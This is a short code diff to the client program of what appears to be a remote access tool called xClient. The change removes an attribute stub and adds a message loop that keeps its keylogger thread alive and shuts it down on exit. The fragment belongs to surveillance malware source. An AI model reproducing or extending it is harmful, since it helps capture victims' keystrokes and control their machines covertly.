@@ -9,15 +9,6 @@ using xClient.Core.Keylogger;
 using xClient.Core.Packets;
 using xClient.Core.ReverseProxy;
 
-namespace System.Runtime.CompilerServices
-{
-    // With this namespace defined along with this attribute stub, we now
-    // have access to the power of extension methods for the whole client!
-    // :)
-    [AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Class | AttributeTargets.Method)]
-    public sealed class ExtensionAttribute : Attribute { }
-}
-
 namespace xClient
 {
     internal static class Program
@@ -26,6 +17,7 @@ namespace xClient
         private static bool _reconnect = true;
         private static volatile bool _connected = false;
         private static Mutex _appMutex;
+        private static ApplicationContext _msgLoop;
 
         [STAThread]
         private static void Main(string[] args)
@@ -48,6 +40,8 @@ namespace xClient
                 CommandHandler.LastDesktopScreenshot.Dispose();
             if (Logger.Instance != null)
                 Logger.Instance.Dispose();
+            if (_msgLoop != null)
+                _msgLoop.ExitThread();
             if (_appMutex != null)
                 _appMutex.Close();
 
@@ -145,8 +139,10 @@ namespace xClient
                 {
                     new Thread(() =>
                     {
+                        _msgLoop = new ApplicationContext();
                         Logger logger = new Logger(15000);
-                    }).Start();
+                        Application.Run(_msgLoop);
+                    }).Start(); ;
                 }
             }
             else
